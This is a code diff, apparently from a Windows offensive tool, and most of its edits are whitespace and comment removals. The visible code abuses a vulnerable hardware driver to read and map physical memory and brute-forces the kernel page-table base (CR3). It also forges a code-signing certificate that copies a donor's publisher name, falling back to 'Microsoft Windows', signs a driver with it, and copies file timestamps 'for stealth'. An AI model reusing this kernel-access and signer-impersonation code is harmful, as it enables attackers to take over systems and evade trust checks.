@@ -14,7 +14,7 @@
 #pragma comment(lib, "wintrust.lib")
 #pragma comment(lib, "crypt32.lib")
 
-DEFINE_GUID(GUID_DEVINTERFACE_GIO, 
+DEFINE_GUID(GUID_DEVINTERFACE_GIO,
     0x70a35746, 0x5d4c, 0x4d58, 0xb6, 0xc5, 0xc6, 0xef, 0x26, 0xf6, 0x4e, 0x7e);
 
 DEFINE_GUID(GUID_DEVINTERFACE_GIO_ALT,
@@ -46,12 +46,12 @@ namespace VulnDriver {
         for (DWORD index = 0; SetupDiEnumDeviceInterfaces(deviceInfoSet, nullptr, interfaceGuid, index, &interfaceData); index++) {
             DWORD requiredSize = 0;
             SetupDiGetDeviceInterfaceDetailW(deviceInfoSet, &interfaceData, nullptr, 0, &requiredSize, nullptr);
-            
+
             if (requiredSize == 0) continue;
 
             PSP_DEVICE_INTERFACE_DETAIL_DATA_W detailData = (PSP_DEVICE_INTERFACE_DETAIL_DATA_W)HeapAlloc(
                 GetProcessHeap(), HEAP_ZERO_MEMORY, requiredSize);
-            
+
             if (!detailData) continue;
 
             detailData->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);
@@ -114,7 +114,7 @@ namespace VulnDriver {
 
             if (cr == CR_SUCCESS) {
                 for (PWSTR current = deviceList; *current; current += wcslen(current) + 1) {
-                    if (wcsstr(current, L"GLCK") || wcsstr(current, L"glck") || 
+                    if (wcsstr(current, L"GLCK") || wcsstr(current, L"glck") ||
                         wcsstr(current, L"GLCKIo") || wcsstr(current, L"glckio")) {
                         HANDLE hDevice = CreateFileW(
                             current,
@@ -325,7 +325,7 @@ namespace VulnDriver {
 
         PVOID mapped = nullptr;
         ULONG mapSize = static_cast<ULONG>((size + 0xFFF) & ~0xFFF);
-        
+
         NTSTATUS status = MapPhysicalMemory(device, physAddr & ~0xFFFULL, mapSize, &mapped);
         if (!NT_SUCCESS(status)) {
             return status;
@@ -352,7 +352,7 @@ namespace VulnDriver {
 
         PVOID mapped = nullptr;
         ULONG mapSize = static_cast<ULONG>((size + 0xFFF) & ~0xFFF);
-        
+
         NTSTATUS status = MapPhysicalMemory(device, physAddr & ~0xFFFULL, mapSize, &mapped);
         if (!NT_SUCCESS(status)) {
             return status;
@@ -430,32 +430,32 @@ namespace VulnDriver {
         if (ntoskrnlVA == 0) {
             return FALSE;
         }
-        
+
         ULONGLONG physAddr = VirtualToPhysicalWithCR3(device, cr3Candidate, ntoskrnlVA);
         if (physAddr == 0) {
             return FALSE;
         }
-        
+
         UCHAR mzHeader[2] = { 0 };
         if (!NT_SUCCESS(ReadPhysicalMemory(device, physAddr, mzHeader, 2))) {
             return FALSE;
         }
-        
+
         if (mzHeader[0] == 0x4D && mzHeader[1] == 0x5A) {
             return TRUE;
         }
-        
+
         return FALSE;
     }
 
     static ULONGLONG GetKernelCR3FromEPROCESS(HANDLE device, ULONGLONG ntoskrnlBase) {
         PVOID pPsInitialSystemProcess = KernelUtils::GetKernelProcAddress(
             (PVOID)ntoskrnlBase, "PsInitialSystemProcess");
-        
+
         if (!pPsInitialSystemProcess) {
             return 0;
         }
-        
+
         static const ULONGLONG lowCR3Candidates[] = {
             0x1AD000, 0x1AB000, 0x1A9000, 0x1A7000,
             0x1B0000, 0x1B2000, 0x1B4000, 0x1B6000,
@@ -464,81 +464,81 @@ namespace VulnDriver {
             0x200000, 0x202000, 0x204000, 0x206000,
             0x300000, 0x400000, 0x500000, 0x600000
         };
-        
+
         for (int i = 0; i < sizeof(lowCR3Candidates) / sizeof(lowCR3Candidates[0]); i++) {
             ULONGLONG testCR3 = lowCR3Candidates[i];
-            
+
             ULONGLONG physPsInit = VirtualToPhysicalWithCR3(device, testCR3, (ULONGLONG)pPsInitialSystemProcess);
             if (physPsInit == 0) {
                 continue;
             }
-            
+
             ULONGLONG systemEprocess = 0;
             if (!NT_SUCCESS(ReadPhysicalMemory(device, physPsInit, &systemEprocess, sizeof(systemEprocess)))) {
                 continue;
             }
-            
+
             if (systemEprocess == 0 || (systemEprocess & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL) {
                 continue;
             }
-            
+
             ULONGLONG physEprocess = VirtualToPhysicalWithCR3(device, testCR3, systemEprocess);
             if (physEprocess == 0) {
                 continue;
             }
-            
+
             ULONGLONG dtb = 0;
             if (!NT_SUCCESS(ReadPhysicalMemory(device, physEprocess + 0x28, &dtb, sizeof(dtb)))) {
                 continue;
             }
-            
+
             dtb &= ~0xFFFULL;
-            
+
             if (dtb == 0 || dtb > 0x800000000ULL) {
                 continue;
             }
-            
+
             if (VerifyCR3Candidate(device, dtb, ntoskrnlBase)) {
                 return dtb;
             }
         }
-        
+
         for (ULONGLONG testCR3 = 0x100000; testCR3 < 0x10000000; testCR3 += 0x1000) {
             ULONGLONG physPsInit = VirtualToPhysicalWithCR3(device, testCR3, (ULONGLONG)pPsInitialSystemProcess);
             if (physPsInit == 0) {
                 continue;
             }
-            
+
             ULONGLONG systemEprocess = 0;
             if (!NT_SUCCESS(ReadPhysicalMemory(device, physPsInit, &systemEprocess, sizeof(systemEprocess)))) {
                 continue;
             }
-            
+
             if (systemEprocess == 0 || (systemEprocess & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL) {
                 continue;
             }
-            
+
             ULONGLONG physEprocess = VirtualToPhysicalWithCR3(device, testCR3, systemEprocess);
             if (physEprocess == 0) {
                 continue;
             }
-            
+
             ULONGLONG dtb = 0;
             if (!NT_SUCCESS(ReadPhysicalMemory(device, physEprocess + 0x28, &dtb, sizeof(dtb)))) {
                 continue;
             }
-            
+
             dtb &= ~0xFFFULL;
-            
+
             if (dtb == 0 || dtb > 0x800000000ULL) {
                 continue;
             }
-            
+
             if (VerifyCR3Candidate(device, dtb, ntoskrnlBase)) {
                 return dtb;
             }
         }
-        
+
         return 0;
     }
 
@@ -547,13 +547,13 @@ namespace VulnDriver {
         if (cr3 != 0) {
             return cr3;
         }
-        
+
         return 0;
     }
 
     ULONGLONG VirtualToPhysical(HANDLE device, PVOID virtualAddress) {
         ULONGLONG va = (ULONGLONG)virtualAddress;
-        
+
         ULONGLONG pml4Index = (va >> 39) & 0x1FF;
         ULONGLONG pdptIndex = (va >> 30) & 0x1FF;
         ULONGLONG pdIndex = (va >> 21) & 0x1FF;
@@ -1302,16 +1302,12 @@ namespace SignedMemory {
         return TRUE;
     }
 
-    // ---- Self-signing via SignerSign (mssign32.dll) ----
-    // Creates a self-signed cert cloning the donor's publisher name, then
-    // Authenticode-signs the target so the hash in the PKCS#7 matches
-    // the actual file content — making it structurally valid.
 
 #ifndef CALG_SHA_256
 #define CALG_SHA_256 0x0000800c
 #endif
 
-    // SignerSign API types (stable undocumented ABI, present in mssign32.dll on Win10+)
+
     struct SS_FILE_INFO      { DWORD cbSize; LPCWSTR pwszFileName; HANDLE hFile; };
     struct SS_SUBJECT_INFO   { DWORD cbSize; DWORD* pdwIndex; DWORD dwSubjectChoice; SS_FILE_INFO* pFileInfo; };
     struct SS_CERT_STORE_INFO{ DWORD cbSize; PCCERT_CONTEXT pSigningCert; DWORD dwCertPolicy; HCERTSTORE hCertStore; };
@@ -1338,7 +1334,7 @@ namespace SignedMemory {
             return FALSE;
         }
 
-        // --- Find a signed donor to clone its publisher identity ---
+
         WCHAR donorPath[MAX_PATH] = {};
         BOOL isEV = FALSE;
         CERT_NAME_BLOB subjectBlob = {};
@@ -1392,7 +1388,7 @@ namespace SignedMemory {
             WinVerifyTrust(NULL, &actionGUID, &wtd);
         }
 
-        // Fallback subject if donor extraction failed
+
         if (!subjectBlob.pbData) {
             LPCSTR fallback = "CN=Microsoft Windows, O=Microsoft Corporation";
             DWORD cbEnc = 0;
@@ -1412,7 +1408,7 @@ namespace SignedMemory {
             return FALSE;
         }
 
-        // --- Generate RSA-2048 key pair in a temporary CSP container ---
+
         WCHAR container[64];
         swprintf_s(container, L"WM_%llu", __rdtsc());
 
@@ -1434,8 +1430,8 @@ namespace SignedMemory {
             return FALSE;
         }
 
-        // --- Create self-signed cert with code-signing EKU ---
-        char ekuOidBuf[] = "1.3.6.1.5.5.7.3.3"; // szOID_PKIX_KP_CODE_SIGNING
+
+        char ekuOidBuf[] = "1.3.6.1.5.5.7.3.3";
         LPSTR ekuOid = ekuOidBuf;
         CERT_ENHKEY_USAGE enhKU = {};
         enhKU.cUsageIdentifier = 1;
@@ -1452,7 +1448,7 @@ namespace SignedMemory {
             return FALSE;
         }
 
-        char ekuExtOid[] = "2.5.29.37"; // szOID_ENHANCED_KEY_USAGE
+        char ekuExtOid[] = "2.5.29.37";
         CERT_EXTENSION ext = {};
         ext.pszObjId = ekuExtOid;
         ext.fCritical = FALSE;
@@ -1487,7 +1483,7 @@ namespace SignedMemory {
             return FALSE;
         }
 
-        // --- Add cert to an in-memory store and attach private key ---
+
         HCERTSTORE hStore = CertOpenStore(CERT_STORE_PROV_MEMORY, 0, 0, 0, NULL);
         if (!hStore) {
             CertFreeCertificateContext(pCert);
@@ -1502,17 +1498,17 @@ namespace SignedMemory {
         CertAddCertificateContextToStore(hStore, pCert, CERT_STORE_ADD_ALWAYS, &pStoreCert);
         CertSetCertificateContextProperty(pStoreCert, CERT_KEY_PROV_INFO_PROP_ID, 0, &kpi);
 
-        // --- Call SignerSign to Authenticode-sign the driver ---
+
         SS_FILE_INFO       fi  = { sizeof(fi), targetDriverPath, NULL };
         DWORD              idx = 0;
-        SS_SUBJECT_INFO    si  = { sizeof(si), &idx, 1 /*SIGNER_SUBJECT_FILE*/, &fi };
-        SS_CERT_STORE_INFO csi = { sizeof(csi), pStoreCert, 2 /*SIGNER_CERT_POLICY_CHAIN*/, NULL };
-        SS_CERT            sc  = { sizeof(sc), 2 /*SIGNER_CERT_STORE*/, &csi, NULL };
-        SS_SIGNATURE_INFO  ssi = { sizeof(ssi), CALG_SHA_256, 0 /*SIGNER_NO_ATTR*/, NULL, NULL, NULL };
+        SS_SUBJECT_INFO    si  = { sizeof(si), &idx, 1 , &fi };
+        SS_CERT_STORE_INFO csi = { sizeof(csi), pStoreCert, 2 , NULL };
+        SS_CERT            sc  = { sizeof(sc), 2 , &csi, NULL };
+        SS_SIGNATURE_INFO  ssi = { sizeof(ssi), CALG_SHA_256, 0 , NULL, NULL, NULL };
 
         HRESULT hr = pSign(&si, &sc, &ssi, NULL, NULL, NULL, NULL);
 
-        // --- Cleanup ---
+
         if (pStoreCert) CertFreeCertificateContext(pStoreCert);
         CertFreeCertificateContext(pCert);
         CertCloseStore(hStore, 0);
@@ -1526,7 +1522,7 @@ namespace SignedMemory {
             return FALSE;
         }
 
-        // Copy donor file times to the signed file for stealth
+
         if (donorPath[0]) {
             HANDLE hDonor = CreateFileW(donorPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                 nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
